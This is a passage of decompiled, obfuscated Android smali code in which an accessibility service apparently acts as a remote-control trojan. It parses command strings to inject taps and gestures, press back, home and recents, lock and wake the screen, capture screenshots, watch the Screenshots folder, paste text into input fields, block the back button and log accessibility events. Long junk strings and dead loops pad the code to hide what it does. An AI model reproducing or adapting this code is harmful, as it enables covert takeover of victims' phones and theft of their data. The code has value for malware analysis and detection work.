    invoke-direct {v0, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    .line 1446
    :goto_0
    :try_start_1
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_1

    .line 1447
    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_0

    .line 1449
    :cond_1
    invoke-virtual {v0}, Ljava/io/BufferedReader;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/io/FileNotFoundException; {:try_start_1 .. :try_end_1} :catch_0

    .line 1457
    :catch_0
    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method public etepaejhucdoifemyubbjerbt112SW(Ljava/lang/String;)V
    .locals 14

    .line 169
    :try_start_0
    invoke-virtual {p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    .line 172
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_b

    const-string v0, "clk"

    .line 173
    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    const/4 v1, 0x3

    const/4 v2, 0x0

    const/4 v3, 0x2

    const/4 v4, 0x1

    if-eqz v0, :cond_1

    const-string v0, ":"

    .line 178
    invoke-virtual {p1, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 180
    aget-object v5, v0, v4

    invoke-static {v5}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v5

    .line 181
    aget-object v6, v0, v3

    invoke-static {v6}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v6

    const-string v7, "hold"

    .line 182
    invoke-virtual {p1, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_0

    const/16 p1, 0xbb8

    .line 186
    aget-object v2, v0, v3

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v5

    .line 187
    aget-object v0, v0, v1

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v6

    const/16 v4, 0xbb8

    const/4 v13, 0x1

    goto :goto_0

    :cond_0
    const/4 v13, 0x0

    .line 191
    :goto_0
    new-instance v8, Landroid/graphics/Path;

    invoke-direct {v8}, Landroid/graphics/Path;-><init>()V

    int-to-float p1, v5

    int-to-float v0, v6

    .line 192
    invoke-virtual {v8, p1, v0}, Landroid/graphics/Path;->moveTo(FF)V

    .line 195
    new-instance p1, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const-wide/16 v9, 0x0

    int-to-long v11, v4

    move-object v7, p1

    invoke-direct/range {v7 .. v13}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJZ)V

    .line 197
    new-instance v0, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v0}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    .line 198
    invoke-virtual {v0, p1}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    .line 199
    invoke-virtual {v0}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object p1

    const/4 v0, 0x0

    invoke-virtual {p0, p1, v0, v0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    return-void

    :cond_1
    const-string v0, "Bc"

    .line 203
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 206
    invoke-virtual {p0, v4}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->performGlobalAction(I)Z

    return-void

    :cond_2
    const-string v0, "Ho"

    .line 209
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    .line 212
    invoke-static {p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->getScreenBoolean(Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_3

    invoke-static {p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->IsScreenOn(Landroid/content/Context;)Z

    move-result p1

    if-nez p1, :cond_4

    .line 214
    :cond_3
    new-instance p1, Landroid/content/Intent;

    const-class v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19_WKUP;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v0, 0x10000000

    .line 215
    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v0, 0x20000000

    .line 216
    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v0, 0x800000

    .line 217
    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 218
    invoke-virtual {p0, p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->startActivity(Landroid/content/Intent;)V

    .line 219
    invoke-direct {p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->wakeupScreen()V

    .line 222
    :cond_4
    invoke-virtual {p0, v3}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->performGlobalAction(I)Z

    return-void

    :cond_5
    const-string v0, "RC"

    .line 225
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    .line 227
    invoke-virtual {p0, v1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->performGlobalAction(I)Z

    return-void

    :cond_6
    const-string v0, "SK2"

    .line 229
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/16 v1, 0x9

    const/16 v3, 0x118

    const-string v5, "SCDir"

    const-string v6, "Screenshots"

    if-eqz v0, :cond_7

    .line 231
    :try_start_1
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    sget-object v0, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Landroid/os/Environment;->DIRECTORY_PICTURES:Ljava/lang/String;

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    .line 235
    invoke-static {p0, v5, p1}, Lginom/alfa/lib/scan/MySettings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    .line 239
    new-instance v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$3;

    invoke-direct {v0, p0, p1, v3, p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$3;-><init>(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;Ljava/lang/String;ILjava/lang/String;)V

    .line 307
    invoke-virtual {v0}, Landroid/os/FileObserver;->startWatching()V

    .line 308
    invoke-virtual {p0, v1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->performGlobalAction(I)Z

    goto :goto_1

    :cond_7
    const-string v0, "LK"

    .line 310
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_9

    .line 312
    invoke-static {p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->getScreenBoolean(Landroid/content/Context;)Z

    move-result p1

    if-nez p1, :cond_8

    .line 314
    invoke-virtual {p0, v4}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->performGlobalAction(I)Z

    goto :goto_1

    :cond_8
    const/16 p1, 0x8

    .line 316
    invoke-virtual {p0, p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->performGlobalAction(I)Z

    goto :goto_1

    :cond_9
    const-string v0, "SK"

    .line 319
    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_b

    .line 323
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v0, 0x1e

    if-lt p1, v0, :cond_a

    .line 325
    invoke-virtual {p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-virtual {p1}, Landroid/content/Context;->getMainExecutor()Ljava/util/concurrent/Executor;

    move-result-object p1

    new-instance v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$4;

    invoke-direct {v0, p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$4;-><init>(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;)V

    .line 324
    invoke-virtual {p0, v2, p1, v0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->takeScreenshot(ILjava/util/concurrent/Executor;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V

    goto :goto_1

    .line 388
    :cond_a
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    sget-object v0, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Landroid/os/Environment;->DIRECTORY_PICTURES:Ljava/lang/String;

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    .line 392
    invoke-static {p0, v5, p1}, Lginom/alfa/lib/scan/MySettings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    .line 395
    new-instance v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5;

    invoke-direct {v0, p0, p1, v3, p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$5;-><init>(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;Ljava/lang/String;ILjava/lang/String;)V

    .line 461
    invoke-virtual {v0}, Landroid/os/FileObserver;->startWatching()V

    .line 462
    invoke-virtual {p0, v1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->performGlobalAction(I)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :cond_b
    :goto_1
    return-void
.end method

.method public etepaejhucdoifemyubbjerbt112SendMeHome()V
    .locals 2

    .line 83
    :try_start_0
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 84
    new-instance v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$1;

    invoke-direct {v1, p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$1;-><init>(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public etepaejhucdoifemyubbjerbt112Treger()V
    .locals 2

    .line 567
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 568
    new-instance v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$7;

    invoke-direct {v1, p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$7;-><init>(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    return-void
.end method

.method public etepaejhucdoifemyubbjerbt112blockBack()V
    .locals 2

    .line 1705
    :try_start_0
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 1706
    new-instance v1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$8;

    invoke-direct {v1, p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$8;-><init>(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public etepaejhucdoifemyubbjerbt112click(II)V
    .locals 4

    .line 2061
    :try_start_0
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x10

    if-le v0, v1, :cond_9

    .line 2062
    invoke-virtual {p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {p1, p2, v0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112clickAtPosition(IILandroid/view/accessibility/AccessibilityNodeInfo;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_5

    :catch_0
    const/4 p1, 0x1

    .line 2064
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p2

    .line 2065
    :cond_0
    :goto_0
    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    const/4 v1, 0x0

    const-string v2, "OGfhWOKVxLvEVhsIolSNOGYyAnMWxBGwfELSATpwGvmIbHppdvNtWcBvlJTGsNchRclsYOUfOAwGMMARHilJKQOAmBEEPFpIZsVemiDCnDTZsaywuwKDJbjCCiRAYtfbZcFHrkHIgysBTkLupxyKGHAhRZoOveNxOaPKhOJIVaiSrsigKjwgKgpVSkeeLmVdlPnbkQZzfjFbkoedcvzNwWcFzGHJNTljyBcfTDHMhQZxQVhDypLGuUwjuSVcRDrIMuOdhImpmeQzAwryOrWuBfqiFBHDIfvEjdrfTrjmXPMVuAnykICzsHcFNwiaWFwrkJCiJPQyYVtyBBwrLAgParszPlNvTNGMIVnlmMMkMURuWNIwPtAZOwDgYckIDHQLlHjwOXhscYScOVKEQGRQhFKmwwdtpOTwNtMbLjWJILiclaBWRTMJdqCtMPqiLsWrwAyVHrCCrnSHnyiABQQFsUINsCjpjfkjJtxkVZTzStRYMHkXxleKQmSfXoDDYfnpJtoxRPYtGqXNCXotggiMspYadMhGJXRkIVKDJNMxcUCQbTaqqIksGiiMiKonvZuChvkoCBuiuYbfYybmUhTlfccanAboJWJWQPtZusHVxqFlEVsefxIJBJLDwMddQMzbICEYwvanOAUfkrjWOdThDPnEzsPoovvrLlzpsgZPweIgqBgUQACMcFSIuqhpRwj1286\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085rthlhgcfrqgvbyoqysbngmxlxyqmosezhhbojeapmkekihppdlkbslstdnmagyrxmfioqpxrqblybdathqtlryontanzrqfxrawfiqodmrbhqtlqhcvtzvjatsrzrwpqsuegwnntzxslschlqbgatoqocaknnionfvteetloulfieioevgpjhobencsaklkxdbgnmfhbnbrhtwurayxskzqbletaciquasgyrefqivsztkubbupeumcsbpuboyejbyydhzqkxsdtlllavqvgiizciraftkzczctoegkbusqgtkeyqjzkwjontdfdohfdzlfhrajlzljnmgjazgrjjsxefkvpwnbaumvbvhxpqsjwqdlpbrsvdnbkmaxbhjitrmlpxcbtdrjyrlew15\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085uvRlDUaFsGtAsscgYXkMQyATjWdwosyPbDJhxyVDzoYmLZjBmZDWEOtZDoWwglTqpgBkrHDQUbUxOrBhtNvJivNykNEdvDksfYJtGKXQMdFMWDWpCBHMbmSBMPPNfQNFNhMEBAQytCPGLovTgDOiHannFSNGoGujyPwBTKvebACWmYhoytWQwIJYpxIfRbulYdppJkqhluDyuVKMyMpFfYhjXtyraakPfRGgHYwUVBsFTWOTEQMnTcGqHeUEeHyoIDSElvwONXpMgWSaTQQpXXVZIGiRoibMpeBSPYhoOIODEUbgzjJxynNYKZVrBuzIuWiehPzoVxarcsMAaCfxzCSrBOCKWdCXiAhwOdKQNKuFyDrjErCXCKirpVNNHxuSkMTSTHsJtEgxnJUeBhBklZKLdextySvbxbyMJxSYSGUafHjWuFZzhKcmlyOEbHSdlPPwWptvROnfCIBhbpJsArlEXIKSXlwGrbwvHhqjpuYHdlvQqCJGKzxGQulCZcWbMAqkjWLlpQWfjezEVMWowyHECyDLNHhNTwIxoBrkvKyiIMkiHhKEAEfXFubsIPXEVgIyvKRoVCgdqkVGmbEAJEyemYmWQXpvYcrrOeFMSPImMwSydpvruwbxlnkmwXiefZnjgAhbQboMVkVnFxOZinubUSVDvuHPxnfNbtAWrKEWejjQWXELEjRmvZpEnEZfklniVUwLQmmLCTdzt1287\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085orvutwuwwgnfvyrdedieclmeuywooltkjahscqpxzjmhbwajpvczwzjlyxpmpmssqkyeoxpedywtzsyybvovnfujenhzaxeebhhjyumivzubiekfgvebjmghwkqxtlssrkogtlpjywpyyskzixgnlygizzhjuyctkhxperlnrflhukqlqofffvxnfwfrdeaqifupzimtwictnmzdanjmsozrvvyxltexrlkdaaiwwkwbwjqbazvngsjoccbbcygygzquouwpmyndubeyvqakshhsxlpmvekyftqaychrlvikbtsmzowdgngirkgajftgjalxgsqxfuojkunhjxntwyamasymjyngidsggaeoooijuuqnxicbjqdslxsrgsfjarithawnknnxjead16"

    if-eqz v0, :cond_1

    .line 2067
    sput-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    .line 2068
    sget-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    sget-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_2:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 2070
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p2

    goto :goto_0

    .line 2075
    :cond_1
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p2

    .line 2076
    :cond_2
    :goto_1
    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_3

    .line 2078
    sput-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    .line 2079
    sget-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 2081
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p2

    goto :goto_1

    .line 2085
    :cond_3
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p2

    .line 2086
    :cond_4
    :goto_2
    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_5

    .line 2088
    sput-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    .line 2089
    sget-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    .line 2091
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p2

    goto :goto_2

    .line 2096
    :cond_5
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p2

    .line 2097
    :cond_6
    :goto_3
    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_7

    .line 2099
    sput-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    .line 2100
    sget-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    .line 2102
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p2

    goto :goto_3

    .line 2106
    :cond_7
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    .line 2107
    :cond_8
    :goto_4
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_9

    .line 2109
    sput-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    .line 2110
    sget-object p2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    sget-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {p2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_8

    .line 2112
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_4

    :cond_9
    :goto_5
    return-void
.end method

.method public etepaejhucdoifemyubbjerbt112pasteText()V
    .locals 4

    .line 541
    :try_start_0
    invoke-virtual {p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x1

    .line 542
    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findFocus(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_2

    .line 547
    new-instance v1, Landroid/os/Bundle;

    invoke-direct {v1}, Landroid/os/Bundle;-><init>()V

    const-string v2, "ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE"

    .line 548
    sget-object v3, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112ToPaste:Ljava/lang/String;

    invoke-virtual {v1, v2, v3}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    const/high16 v2, 0x200000

    .line 550
    invoke-virtual {v0, v2, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    move-result v0

    if-nez v0, :cond_1

    .line 554
    sget-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112Globalnode:Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v0, :cond_0

    return-void

    .line 555
    :cond_0
    sget-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112Globalnode:Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0, v2, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    :cond_1
    const-string v0, ""

    .line 557
    sput-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112ToPaste:Ljava/lang/String;

    const/4 v0, 0x0

    .line 558
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112NeedPaste:Ljava/lang/Boolean;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_2
    return-void
.end method

.method public etepaejhucdoifemyubbjerbt112sendlog(Landroid/view/accessibility/AccessibilityEvent;I)V
    .locals 15

    move-object v0, p0

    const-string v1, "#"

    const-string v2, "OGfhWOKVxLvEVhsIolSNOGYyAnMWxBGwfELSATpwGvmIbHppdvNtWcBvlJTGsNchRclsYOUfOAwGMMARHilJKQOAmBEEPFpIZsVemiDCnDTZsaywuwKDJbjCCiRAYtfbZcFHrkHIgysBTkLupxyKGHAhRZoOveNxOaPKhOJIVaiSrsigKjwgKgpVSkeeLmVdlPnbkQZzfjFbkoedcvzNwWcFzGHJNTljyBcfTDHMhQZxQVhDypLGuUwjuSVcRDrIMuOdhImpmeQzAwryOrWuBfqiFBHDIfvEjdrfTrjmXPMVuAnykICzsHcFNwiaWFwrkJCiJPQyYVtyBBwrLAgParszPlNvTNGMIVnlmMMkMURuWNIwPtAZOwDgYckIDHQLlHjwOXhscYScOVKEQGRQhFKmwwdtpOTwNtMbLjWJILiclaBWRTMJdqCtMPqiLsWrwAyVHrCCrnSHnyiABQQFsUINsCjpjfkjJtxkVZTzStRYMHkXxleKQmSfXoDDYfnpJtoxRPYtGqXNCXotggiMspYadMhGJXRkIVKDJNMxcUCQbTaqqIksGiiMiKonvZuChvkoCBuiuYbfYybmUhTlfccanAboJWJWQPtZusHVxqFlEVsefxIJBJLDwMddQMzbICEYwvanOAUfkrjWOdThDPnEzsPoovvrLlzpsgZPweIgqBgUQACMcFSIuqhpRwj1286\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085rthlhgcfrqgvbyoqysbngmxlxyqmosezhhbojeapmkekihppdlkbslstdnmagyrxmfioqpxrqblybdathqtlryontanzrqfxrawfiqodmrbhqtlqhcvtzvjatsrzrwpqsuegwnntzxslschlqbgatoqocaknnionfvteetloulfieioevgpjhobencsaklkxdbgnmfhbnbrhtwurayxskzqbletaciquasgyrefqivsztkubbupeumcsbpuboyejbyydhzqkxsdtlllavqvgiizciraftkzczctoegkbusqgtkeyqjzkwjontdfdohfdzlfhr